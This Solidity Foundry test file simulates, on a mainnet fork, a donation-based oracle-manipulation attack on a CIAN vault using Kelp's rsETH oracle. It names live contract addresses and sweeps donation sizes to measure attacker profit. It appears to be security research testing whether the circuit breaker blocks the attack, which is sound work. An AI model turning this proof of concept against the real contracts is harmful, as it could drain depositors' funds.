// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/*//////////////////////////////////////////////////////////////
    PHASE 2: Full attack simulation, sized to real Kelp TVL, with
    an actual requestRedeem() -> confirmWithdrawal() measurement
    of attacker profit/loss in RSETH terms.

    Confirmed on-chain: RedeemOperator.operator() == CIAN_MANAGER
    (0xAc1894C6914639e18f8FA69FEBd324eE91c96065) - the SAME address
    that is also the Vault's `rebalancer`. This is what makes the
    atomic "updateExchangePrice() + confirmWithdrawal() in one tx"
    workflow possible, and it's why this script can impersonate a
    single address for both calls.

    RUN:
      forge test --match-test testDonationSweepScaledToTVL -vv \
        --fork-url "$MAINNET_RPC_URL"

    (Use -vv not -vvvv here - the sweep prints a clean summary table;
    only re-run a single interesting bps value with -vvvv if you want
    the full call trace for that one case.)
//////////////////////////////////////////////////////////////*/

interface IKelpOracle {
    function rsETHPrice() external view returns (uint256);
    function highestRsethPrice() external view returns (uint256);
    function pricePercentageLimit() external view returns (uint256);
    function updateRSETHPrice() external;
}

interface ICianVaultFull {
    function exchangePrice() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function updateExchangePrice() external returns (uint256 newExchangePrice, uint256 newRevenue);
    function requestRedeem(uint256 _shares, address _token) external;
    // optionalDeposit signature as recovered from source - VERIFY against
    // Etherscan's "Write Contract" ABI for 0xd87a19fF681AE98BF10d2220D1AE3Fbd374ADE4e
    // if this reverts with a selector-mismatch error.
    function optionalDeposit(address _token, uint256 _assets, address _receiver)
        external
        payable
        returns (uint256 shares_);
}

interface IRedeemOperator {
    function confirmWithdrawal(address[] calldata _users, uint256 _totalGasTokenAmount) external;
}

interface IERC20Approve {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract CianKelpOracle_Phase2_Test is Test {
    address constant CIAN_VAULT = 0xd87a19fF681AE98BF10d2220D1AE3Fbd374ADE4e;
    address constant CIAN_MANAGER = 0xAc1894C6914639e18f8FA69FEBd324eE91c96065; // == rebalancer == RedeemOperator.operator()
    address constant REDEEM_OPERATOR = 0x47DBD71Db64617f6cBD45eB9D9Ba876F40ED239E;

    address constant KELP_DEPOSIT_POOL = 0x036676389e48133B63a802f8635AD39E752D375D;
    address constant KELP_ORACLE = 0x349A73444b1a310BAe67ef67973022020d70020d;

    address constant RSETH = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
    address constant ETHx = 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b;

    address attacker = makeAddr("attacker");

    // Attacker's own legitimate deposit, used to mint real vault shares
    // BEFORE any manipulation. Pick something modest relative to vault TVL.
    uint256 constant ATTACKER_DEPOSIT = 10 ether; // 10 ETHx

    // bps of total Kelp TVL to test as donation size: 1bps = 0.01%
    uint16[7] bpsToTry = [uint16(1), 10, 50, 100, 500, 1000, 2500];

    function setUp() public {
        // give the attacker enough ETHx for both the legitimate deposit
        // and every donation size we'll try in the sweep
        deal(ETHx, attacker, 10_000_000 ether, true);
    }

    function testDonationSweepScaledToTVL() public {
        uint256 rsethSupply = IERC20(RSETH).totalSupply();
        uint256 rsethPrice = IKelpOracle(KELP_ORACLE).rsETHPrice();
        uint256 kelpTvlInEth = (rsethSupply * rsethPrice) / 1e18;
        uint256 pctLimit = IKelpOracle(KELP_ORACLE).pricePercentageLimit();

        console2.log("=== LIVE TVL BASELINE ===");
        console2.log("rsETH totalSupply       :", rsethSupply);
        console2.log("Kelp rsETHPrice         :", rsethPrice);
        console2.log("Kelp total TVL (ETH-eq) :", kelpTvlInEth);
        console2.log("Kelp pricePercentageLimit:", pctLimit);
        console2.log("CIAN Vault totalAssets (RSETH-eq):", ICianVaultFull(CIAN_VAULT).totalAssets());
        console2.log("");
        console2.log("bps  | donateETHx          | priceUpdateReverted | exchPriceDelta       | netProfit(RSETH, neg=loss)");
        console2.log("-----|----------------------|----------------------|----------------------|---------------------------");

        for (uint256 i = 0; i < bpsToTry.length; i++) {
            uint256 snap = vm.snapshot();

            uint256 donateAmount = (kelpTvlInEth * bpsToTry[i]) / 10_000;
            (bool reverted, int256 netProfit, int256 exchPriceDelta) = _attemptAttack(donateAmount);

            console2.log(
                string.concat(
                    vm.toString(bpsToTry[i]),
                    " | ",
                    vm.toString(donateAmount),
                    " | ",
                    reverted ? "YES (blocked)" : "no",
                    " | "
                )
            );
            console2.log("   exchPriceDelta:", exchPriceDelta);
            console2.log("   netProfit(RSETH wei):", netProfit);

            vm.revertTo(snap);
        }
    }

    /// @dev Runs ONE full attempt: attacker deposits legitimately, donates,
    /// triggers price update + exchangePrice update + redeem, and returns
    /// whether the Kelp price update was blocked by the circuit breaker,
    /// the resulting exchangePrice delta, and the attacker's net profit
    /// in RSETH wei (received - fair value of shares - donation cost
    /// converted to RSETH terms). Caller must wrap in vm.snapshot/revertTo.
    function _attemptAttack(uint256 donateAmount)
        internal
        returns (bool priceUpdateReverted, int256 netProfitRSETH, int256 exchPriceDelta)
    {
        // ---- STEP 0: attacker makes a LEGITIMATE deposit first, at the
        // pre-manipulation price, to obtain real vault shares ----
        vm.startPrank(attacker);
        IERC20Approve(ETHx).approve(CIAN_VAULT, ATTACKER_DEPOSIT);
        uint256 sharesReceived;
        try ICianVaultFull(CIAN_VAULT).optionalDeposit(ETHx, ATTACKER_DEPOSIT, attacker) returns (uint256 s) {
            sharesReceived = s;
        } catch {
            console2.log("  !! optionalDeposit() reverted - check ABI signature, aborting this attempt");
            vm.stopPrank();
            return (false, 0, 0);
        }
        vm.stopPrank();

        uint256 exchPriceBefore = ICianVaultFull(CIAN_VAULT).exchangePrice();
        // fair RSETH-equivalent value of attacker's shares at the honest price
        uint256 fairValueBefore = (sharesReceived * exchPriceBefore) / 1e18;

        // ---- STEP 1: attacker registers the redeem request NOW, before
        // manipulating anything, locking in their position in the queue ----
        vm.startPrank(attacker);
        IERC20Approve(CIAN_VAULT).approve(REDEEM_OPERATOR, sharesReceived);
        ICianVaultFull(CIAN_VAULT).requestRedeem(sharesReceived, RSETH);
        vm.stopPrank();

        // ---- STEP 2: donate to Kelp's pool ----
        if (donateAmount > 0) {
            deal(ETHx, attacker, IERC20(ETHx).balanceOf(attacker) + donateAmount, true);
            vm.prank(attacker);
            IERC20(ETHx).transfer(KELP_DEPOSIT_POOL, donateAmount);
        }

        // ---- STEP 3: trigger Kelp's permissionless price update ----
        vm.prank(attacker);
        try IKelpOracle(KELP_ORACLE).updateRSETHPrice() {
            priceUpdateReverted = false;
        } catch {
            priceUpdateReverted = true;
        }

        // ---- STEP 4 + 5: Manager updates CIAN's exchangePrice, then
        // (SAME transaction - required for RedeemOperator's EIP-1153
        // lastExchangePrice() check) confirms the attacker's withdrawal ----
        uint256 exchPriceAfter = exchPriceBefore; // default if update fails
        vm.prank(CIAN_MANAGER);
        try ICianVaultFull(CIAN_VAULT).updateExchangePrice() returns (uint256 newPrice, uint256) {
            exchPriceAfter = newPrice;
        } catch {
            // Vault-level update failed (e.g. maxPriceUpdatePeriod guard) -
            // record a zero delta and skip the redeem confirmation entirely,
            // since confirmWithdrawal() would revert anyway without a fresh
            // same-tx transient-storage price snapshot.
            return (priceUpdateReverted, 0, 0);
        }

        address[] memory users = new address[](1);
        users[0] = attacker;

        uint256 rsethBefore = IERC20(RSETH).balanceOf(attacker);
        vm.prank(CIAN_MANAGER); // == RedeemOperator.operator()
        try IRedeemOperator(REDEEM_OPERATOR).confirmWithdrawal(users, 0) {
            // success
        } catch {
            console2.log("  !! confirmWithdrawal() reverted for this attempt");
            return (priceUpdateReverted, 0, int256(exchPriceAfter) - int256(exchPriceBefore));
        }
        uint256 rsethAfter = IERC20(RSETH).balanceOf(attacker);
        uint256 rsethReceived = rsethAfter - rsethBefore;

        // ---- STEP 6: compute net profit ----
        // donation cost converted to RSETH terms at the (manipulated) Kelp price
        uint256 kelpPriceNow = IKelpOracle(KELP_ORACLE).rsETHPrice();
        uint256 donationCostInRSETH = kelpPriceNow == 0 ? 0 : (donateAmount * 1e18) / kelpPriceNow;

        netProfitRSETH = int256(rsethReceived) - int256(fairValueBefore) - int256(donationCostInRSETH);
        exchPriceDelta = int256(exchPriceAfter) - int256(exchPriceBefore);
    }
}
